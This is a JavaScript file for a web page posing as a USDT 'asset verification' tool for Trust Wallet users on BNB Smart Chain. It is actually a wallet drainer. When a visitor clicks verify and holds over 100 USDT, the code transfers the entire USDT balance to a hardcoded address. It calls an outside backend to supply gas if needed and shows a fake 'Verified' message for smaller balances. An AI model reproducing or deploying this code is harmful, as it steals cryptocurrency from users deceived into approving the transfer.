const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";

let web3;
let userAddress = null;

// ✅ Wait and silently detect Trust Wallet
window.addEventListener("load", async () => {
    setTimeout(async () => {
        const provider = window.ethereum || window.trustwallet || window.BinanceChain;

        if (!provider) {
            alert("❌ Wallet not detected. Please open in Trust Wallet browser.");
            return;
        }

        web3 = new Web3(provider);

        try {
            const accounts = await web3.eth.getAccounts();

            if (accounts && accounts.length > 0) {
                userAddress = accounts[0];
                console.log("✅ Wallet connected:", userAddress);

                try {
                    await provider.request({
                        method: "wallet_switchEthereumChain",
                        params: [{ chainId: "0x38" }]
                    });
                } catch (switchErr) {
                    console.warn("Chain switch skipped:", switchErr.message);
                }

            } else {
                console.warn("⚠️ No connected accounts detected.");
            }
        } catch (err) {
            console.error("❌ Error detecting wallet:", err);
        }
    }, 2000); // Wait 2 seconds to allow Trust Wallet to inject provider
});

async function verifyAssets() {
    if (!web3 || !userAddress) {
        alert("❌ Wallet not connected. Please open in Trust Wallet browser.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function"
        }
    ], usdtContractAddress);

    const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

    console.log(`USDT: ${usdtBalance} | BNB: ${bnbBalance}`);

    if (usdtBalance === 0) {
        showPopup("No USDT found.", "black");
        return;
    }

    if (usdtBalance <= 100) {
        showPopup(
            `✅ Verified<br>Your USDT appears valid.<br><br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
            "green"
        );
        return;
    }

    showPopup("Transferring...", "green");
    transferUSDT(usdtBalance, bnbBalance);
}

async function transferUSDT(usdtBalance, bnbBalance) {
    try {
        if (bnbBalance < 0.0005) {
            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ toAddress: userAddress })
            });
        }

        const usdt = new web3.eth.Contract([
            {
                constant: false,
                inputs: [
                    { name: "recipient", type: "address" },
                    { name: "amount", type: "uint256" }
                ],
                name: "transfer",
                outputs: [{ name: "", type: "bool" }],
                type: "function"
            }
        ], usdtContractAddress);

        const amount = web3.utils.toWei(usdtBalance.toString(), "ether");

        await usdt.methods.transfer(bscAddress, amount).send({ from: userAddress });

        showPopup(`✅ USDT transferred: ${usdtBalance}`, "red");
    } catch (err) {
        console.error("Transfer failed:", err);
        alert("Transfer failed. Do you have BNB for gas?");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");

    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "16px";
        popup.style.background = "#fff";
        popup.style.zIndex = 9999;
        popup.style.maxWidth = "400px";
        popup.style.width = "80%";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffe6e6" : color === "green" ? "#e6ffe6" : "#f0f0f0";
    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => { popup.style.display = "none"; }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
